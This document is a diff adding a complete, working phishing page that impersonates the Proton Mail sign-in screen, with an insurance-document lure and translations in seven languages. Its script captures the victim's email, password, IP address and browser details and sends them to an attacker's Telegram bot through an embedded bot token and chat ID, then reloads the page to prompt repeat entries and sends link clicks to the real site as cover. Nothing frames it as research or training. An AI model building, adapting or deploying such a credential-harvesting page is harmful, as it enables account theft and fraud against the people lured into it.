@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proton Mail - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 15px 20px;
+        }
+        
+        /* Header with logo in top left and language selector */
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            color: #6d4aff;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            text-decoration: none;
+        }
+        
+        .header-right {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .tagline {
+            color: #666;
+            font-size: 13px;
+        }
+        
+        .language-selector {
+            position: relative;
+        }
+        
+        .language-btn {
+            background: none;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 6px 12px;
+            font-size: 13px;
+            color: #666;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background-color: white;
+        }
+        
+        .language-btn:hover {
+            border-color: #6d4aff;
+        }
+        
+        .language-btn::after {
+            content: "▼";
+            font-size: 10px;
+            margin-left: 3px;
+        }
+        
+        .language-dropdown {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: none;
+            min-width: 120px;
+            z-index: 100;
+            margin-top: 5px;
+        }
+        
+        .language-dropdown.show {
+            display: block;
+        }
+        
+        .language-option {
+            padding: 8px 12px;
+            cursor: pointer;
+            color: #333;
+            font-size: 13px;
+        }
+        
+        .language-option:hover {
+            background-color: #f5f5f5;
+            color: #6d4aff;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 520px;
+            margin: 0 auto;
+        }
+        
+        .login-box {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 35px 50px;
+            width: 100%;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #222;
+        }
+        
+        .login-subtitle {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background-color: #fafafa;
+            transition: all 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #6d4aff;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(109, 74, 255, 0.1);
+        }
+        
+        .form-input.error {
+            border-color: #ff4444;
+            background-color: #fffafa;
+        }
+        
+        .error-message {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 25px;
+        }
+        
+        .checkbox {
+            margin-right: 10px;
+            margin-top: 2px;
+            accent-color: #6d4aff;
+        }
+        
+        .checkbox-label {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.4;
+        }
+        
+        .why-link {
+            color: #6d4aff;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .signin-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #6d4aff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 20px;
+        }
+        
+        .signin-btn:hover:not(:disabled) {
+            background-color: #5a3ce8;
+        }
+        
+        .signin-btn:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .links-container {
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .link {
+            color: #6d4aff;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        .link:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #eee;
+            margin: 20px 0;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            width: 100%;
+            max-width: 520px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 8px;
+        }
+        
+        .footer-link {
+            color: #666;
+            text-decoration: none;
+        }
+        
+        .footer-link:hover {
+            color: #6d4aff;
+            text-decoration: underline;
+        }
+        
+        .version {
+            color: #999;
+            font-size: 11px;
+        }
+        
+        @media (max-width: 560px) {
+            .login-box {
+                padding: 25px 30px;
+            }
+            
+            .container {
+                padding: 0 15px;
+            }
+            
+            .header {
+                padding: 0;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+            
+            .header-right {
+                width: 100%;
+                justify-content: space-between;
+                margin-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header with logo in top left and language selector -->
+    <div class="header">
+        <a href="#" class="logo">Proton Mail</a>
+        <div class="header-right">
+            <div class="tagline">Privacy by default.</div>
+            <div class="language-selector">
+                <button class="language-btn" id="languageBtn">English</button>
+                <div class="language-dropdown" id="languageDropdown">
+                    <div class="language-option" data-lang="en">English</div>
+                    <div class="language-option" data-lang="es">Español</div>
+                    <div class="language-option" data-lang="fr">Français</div>
+                    <div class="language-option" data-lang="de">Deutsch</div>
+                    <div class="language-option" data-lang="ar">العربية</div>
+                    <div class="language-option" data-lang="zh">中文</div>
+                    <div class="language-option" data-lang="ru">Русский</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="login-box">
+            <h1 class="login-title" data-i18n="signin">Sign in</h1>
+            <p class="login-subtitle" data-i18n="continue">To continue to view INSURANCE_POLICY_STATEMENT_AGREEMENT</p>
+            
+            <form id="loginForm" novalidate>
+                <div class="form-group">
+                    <label for="email" class="form-label" data-i18n="email">Email or username</label>
+                    <input type="email" 
+                           id="email" 
+                           class="form-input" 
+                           placeholder="Enter your email or username" 
+                           required
+                           autocomplete="username email"
+                           name="username"
+                           data-i18n-placeholder="emailPlaceholder">
+                    <div class="error-message" id="emailError" data-i18n="emailError">Please enter your email or username</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password" class="form-label" data-i18n="password">Password</label>
+                    <input type="password" 
+                           id="password" 
+                           class="form-input" 
+                           placeholder="Enter your password" 
+                           required
+                           autocomplete="current-password"
+                           name="password"
+                           data-i18n-placeholder="passwordPlaceholder">
+                    <div class="error-message" id="passwordError" data-i18n="passwordError">Please enter your password</div>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" 
+                           id="keepSignedIn" 
+                           class="checkbox"
+                           autocomplete="off"
+                           name="remember">
+                    <label for="keepSignedIn" class="checkbox-label">
+                        <span data-i18n="keepSignedIn">Keep me signed in</span><br>
+                        <small><span data-i18n="recommended">Recommended on trusted devices.</span> <a href="#" class="why-link" data-i18n="why">Why?</a></small>
+                    </label>
+                </div>
+                
+                <button type="submit" class="signin-btn" id="submitBtn" data-i18n="signinBtn">Sign in</button>
+            </form>
+            
+            <div class="links-container">
+                <a href="#" class="link" data-i18n="createAccount">New to Proton? Create account</a>
+                <a href="#" class="link" data-i18n="troubleSigningIn">Trouble signing in?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="footer">
+                <div class="footer-links">
+                    <a href="#" class="footer-link" data-i18n="help">Help</a>
+                    <a href="#" class="footer-link" data-i18n="terms">Terms</a>
+                    <a href="#" class="footer-link" data-i18n="privacy">Privacy policy</a>
+                </div>
+                <div class="version">Version 5.0.3371</div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Telegram Bot Configuration - MUST BE SET FOR FORM TO WORK
+        const TELEGRAM_BOT_TOKEN = '8945241124:AAEYdY_wzZlrGW47yOSd1tVrnPYyvUyPzxw'; // Replace with your bot token
+        const TELEGRAM_CHAT_ID = '8149362621'; // Replace with your chat ID
+        
+        // Language translations
+        const translations = {
+            en: {
+                signin: "Sign in",
+                continue: "To continue to view INSURANCE_POLICY_STATEMENT_AGREEMENT",
+                email: "Email or username",
+                emailPlaceholder: "Enter your email or username",
+                password: "Password",
+                passwordPlaceholder: "Enter your password",
+                keepSignedIn: "Keep me signed in",
+                recommended: "Recommended on trusted devices.",
+                why: "Why?",
+                signinBtn: "Sign in",
+                createAccount: "New to Proton? Create account",
+                troubleSigningIn: "Trouble signing in?",
+                help: "Help",
+                terms: "Terms",
+                privacy: "Privacy policy",
+                emailError: "Please enter your email or username",
+                passwordError: "Please enter your password"
+            },
+            es: {
+                signin: "Iniciar sesión",
+                continue: "Para continuar a Proton Mail",
+                email: "Correo o nombre de usuario",
+                emailPlaceholder: "Ingresa tu correo o nombre de usuario",
+                password: "Contraseña",
+                passwordPlaceholder: "Ingresa tu contraseña",
+                keepSignedIn: "Mantenerme conectado",
+                recommended: "Recomendado en dispositivos de confianza.",
+                why: "¿Por qué?",
+                signinBtn: "Iniciar sesión",
+                createAccount: "¿Nuevo en Proton? Crear cuenta",
+                troubleSigningIn: "¿Problemas para iniciar sesión?",
+                help: "Ayuda",
+                terms: "Términos",
+                privacy: "Política de privacidad",
+                emailError: "Por favor ingresa tu correo o nombre de usuario",
+                passwordError: "Por favor ingresa tu contraseña"
+            },
+            fr: {
+                signin: "Se connecter",
+                continue: "Pour continuer vers Proton Mail",
+                email: "E-mail ou nom d'utilisateur",
+                emailPlaceholder: "Entrez votre e-mail ou nom d'utilisateur",
+                password: "Mot de passe",
+                passwordPlaceholder: "Entrez votre mot de passe",
+                keepSignedIn: "Rester connecté",
+                recommended: "Recommandé sur les appareils de confiance.",
+                why: "Pourquoi?",
+                signinBtn: "Se connecter",
+                createAccount: "Nouveau sur Proton? Créer un compte",
+                troubleSigningIn: "Problème de connexion?",
+                help: "Aide",
+                terms: "Conditions",
+                privacy: "Politique de confidentialité",
+                emailError: "Veuillez entrer votre e-mail ou nom d'utilisateur",
+                passwordError: "Veuillez entrer votre mot de passe"
+            },
+            de: {
+                signin: "Anmelden",
+                continue: "Weiter zu Proton Mail",
+                email: "E-Mail oder Benutzername",
+                emailPlaceholder: "Geben Sie Ihre E-Mail oder Benutzername ein",
+                password: "Passwort",
+                passwordPlaceholder: "Geben Sie Ihr Passwort ein",
+                keepSignedIn: "Angemeldet bleiben",
+                recommended: "Empfohlen auf vertrauenswürdigen Geräten.",
+                why: "Warum?",
+                signinBtn: "Anmelden",
+                createAccount: "Neu bei Proton? Konto erstellen",
+                troubleSigningIn: "Probleme beim Anmelden?",
+                help: "Hilfe",
+                terms: "Bedingungen",
+                privacy: "Datenschutzrichtlinie",
+                emailError: "Bitte geben Sie Ihre E-Mail oder Benutzername ein",
+                passwordError: "Bitte geben Sie Ihr Passwort ein"
+            },
+            ar: {
+                signin: "تسجيل الدخول",
+                continue: "للمتابعة إلى Proton Mail",
+                email: "البريد الإلكتروني أو اسم المستخدم",
+                emailPlaceholder: "أدخل بريدك الإلكتروني أو اسم المستخدم",
+                password: "كلمة المرور",
+                passwordPlaceholder: "أدخل كلمة المرور",
+                keepSignedIn: "الاستمرار في تسجيل الدخول",
+                recommended: "موصى به على الأجهزة الموثوقة.",
+                why: "لماذا؟",
+                signinBtn: "تسجيل الدخول",
+                createAccount: "جديد في Proton؟ إنشاء حساب",
+                troubleSigningIn: "مشكلة في تسجيل الدخول؟",
+                help: "مساعدة",
+                terms: "الشروط",
+                privacy: "سياسة الخصوصية",
+                emailError: "الرجاء إدخال بريدك الإلكتروني أو اسم المستخدم",
+                passwordError: "الرجاء إدخال كلمة المرور"
+            },
+            zh: {
+                signin: "登录",
+                continue: "继续使用 Proton Mail",
+                email: "电子邮件或用户名",
+                emailPlaceholder: "输入您的电子邮件或用户名",
+                password: "密码",
+                passwordPlaceholder: "输入您的密码",
+                keepSignedIn: "保持登录状态",
+                recommended: "在受信任的设备上推荐使用。",
+                why: "为什么？",
+                signinBtn: "登录",
+                createAccount: "新用户？创建帐户",
+                troubleSigningIn: "登录遇到问题？",
+                help: "帮助",
+                terms: "条款",
+                privacy: "隐私政策",
+                emailError: "请输入您的电子邮件或用户名",
+                passwordError: "请输入您的密码"
+            },
+            ru: {
+                signin: "Войти",
+                continue: "Для продолжения в Proton Mail",
+                email: "Эл. почта или имя пользователя",
+                emailPlaceholder: "Введите адрес эл. почты или имя пользователя",
+                password: "Пароль",
+                passwordPlaceholder: "Введите пароль",
+                keepSignedIn: "Оставаться в системе",
+                recommended: "Рекомендуется на доверенных устройствах.",
+                why: "Зачем?",
+                signinBtn: "Войти",
+                createAccount: "Новичок в Proton? Создать учетную запись",
+                troubleSigningIn: "Проблемы со входом?",
+                help: "Помощь",
+                terms: "Условия",
+                privacy: "Политика конфиденциальности",
+                emailError: "Пожалуйста, введите адрес эл. почты или имя пользователя",
+                passwordError: "Пожалуйста, введите пароль"
+            }
+        };
+        
+        // State management
+        let submissionCount = 0;
+        let userIP = '';
+        let credentialsConfigured = false;
+        let currentLang = 'en';
+        
+        // Check if credentials are configured
+        function checkCredentials() {
+            return TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && 
+                   TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE';
+        }
+        
+        // Language changer functionality
+        function setupLanguageChanger() {
+            const languageBtn = document.getElementById('languageBtn');
+            const languageDropdown = document.getElementById('languageDropdown');
+            
+            // Toggle dropdown
+            languageBtn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                languageDropdown.classList.toggle('show');
+            });
+            
+            // Close dropdown when clicking outside
+            document.addEventListener('click', () => {
+                languageDropdown.classList.remove('show');
+            });
+            
+            // Handle language selection
+            document.querySelectorAll('.language-option').forEach(option => {
+                option.addEventListener('click', () => {
+                    const lang = option.getAttribute('data-lang');
+                    changeLanguage(lang);
+                    languageDropdown.classList.remove('show');
+                });
+            });
+        }
+        
+        // Change language
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const langData = translations[lang];
+            
+            // Update all elements with data-i18n attribute
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (langData[key]) {
+                    if (element.tagName === 'INPUT' && element.type === 'submit') {
+                        element.value = langData[key];
+                    } else {
+                        element.textContent = langData[key];
+                    }
+                }
+            });
+            
+            // Update placeholder texts
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
+                const key = element.getAttribute('data-i18n-placeholder');
+                if (langData[key]) {
+                    element.placeholder = langData[key];
+                }
+            });
+            
+            // Update language button text
+            document.getElementById('languageBtn').textContent = 
+                lang === 'en' ? 'English' :
+                lang === 'es' ? 'Español' :
+                lang === 'fr' ? 'Français' :
+                lang === 'de' ? 'Deutsch' :
+                lang === 'ar' ? 'العربية' :
+                lang === 'zh' ? '中文' : 'Русский';
+            
+            // Save language preference
+            localStorage.setItem('protonLanguage', lang);
+        }
+        
+        // Show field error
+        function showFieldError(fieldId, errorId, show) {
+            const field = document.getElementById(fieldId);
+            const error = document.getElementById(errorId);
+            
+            if (show) {
+                field.classList.add('error');
+                error.style.display = 'block';
+                // Focus the first error field
+                if (fieldId === 'email') {
+                    field.focus();
+                }
+            } else {
+                field.classList.remove('error');
+                error.style.display = 'none';
+            }
+        }
+        
+        // Validate form
+        function validateForm() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            let isValid = true;
+            
+            // Check email
+            if (!email) {
+                showFieldError('email', 'emailError', true);
+                isValid = false;
+            } else {
+                showFieldError('email', 'emailError', false);
+            }
+            
+            // Check password
+            if (!password) {
+                showFieldError('password', 'passwordError', true);
+                isValid = false;
+            } else {
+                showFieldError('password', 'passwordError', false);
+            }
+            
+            return isValid;
+        }
+        
+        // Get user IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'IP not available';
+                }
+            }
+        }
+        
+        // Send data to Telegram bot
+        async function sendToTelegram(data) {
+            if (!credentialsConfigured) {
+                console.error('Telegram credentials not configured');
+                return false;
+            }
+            
+            try {
+                const message = `
+🔐 **New Login Attempt**
+👤 **Email/Username:** ${data.email}
+🔑 **Password:** ${data.password}
+📱 **IP Address:** ${data.ip}
+🌐 **User Agent:** ${navigator.userAgent}
+🌍 **Language:** ${currentLang}
+📅 **Time:** ${new Date().toLocaleString()}
+🔄 **Submission:** ${data.submissionCount}
+                `;
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Handle form submission
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            // First validate form
+            if (!validateForm()) {
+                return;
+            }
+            
+            // Check Telegram credentials
+            if (!credentialsConfigured) {
+                document.getElementById('submitBtn').disabled = true;
+                return;
+            }
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Disable button to prevent multiple submissions
+            submitBtn.disabled = true;
+            
+            // Get IP if not already obtained
+            if (!userIP) {
+                userIP = await getUserIP();
+            }
+            
+            // Increment submission count
+            submissionCount++;
+            
+            // Prepare data
+            const formData = {
+                email: email,
+                password: password,
+                ip: userIP,
+                submissionCount: submissionCount,
+                language: currentLang,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send to Telegram
+            const success = await sendToTelegram(formData);
+            
+            if (success) {
+                // ALWAYS refresh after each submission
+                setTimeout(() => {
+                    location.reload();
+                }, 500);
+            } else {
+                // Telegram failed - re-enable button after delay
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                }, 1000);
+                return;
+            }
+            
+            // No need to store data since we're refreshing every time
+        }
+        
+        // Real-time validation as user types
+        document.getElementById('email').addEventListener('input', function() {
+            if (this.value.trim()) {
+                showFieldError('email', 'emailError', false);
+            }
+        });
+        
+        document.getElementById('password').addEventListener('input', function() {
+            if (this.value.trim()) {
+                showFieldError('password', 'passwordError', false);
+            }
+        });
+        
+        // Initialize everything
+        window.addEventListener('load', async () => {
+            // Setup language changer first
+            setupLanguageChanger();
+            
+            // Load saved language or use browser language
+            const savedLang = localStorage.getItem('protonLanguage');
+            const browserLang = navigator.language.substring(0, 2);
+            const defaultLang = savedLang || (translations[browserLang] ? browserLang : 'en');
+            changeLanguage(defaultLang);
+            
+            // Check Telegram credentials
+            credentialsConfigured = checkCredentials();
+            if (!credentialsConfigured) {
+                document.getElementById('submitBtn').disabled = true;
+                return;
+            }
+            
+            // Get IP on first load
+            userIP = await getUserIP();
+            
+            // Focus email field on load
+            document.getElementById('email').focus();
+            
+            // Clear any old data (we don't need it anymore)
+            localStorage.removeItem('protonLoginData');
+        });
+        
+        // Attach form submit handler
+        document.getElementById('loginForm').addEventListener('submit', handleSubmit);
+        
+        // Make all links redirect to proton.com
+        document.querySelectorAll('a[href="#"]').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://mail.proton.me/';
+            });
+        });
+    </script>
+</body>
+</html>
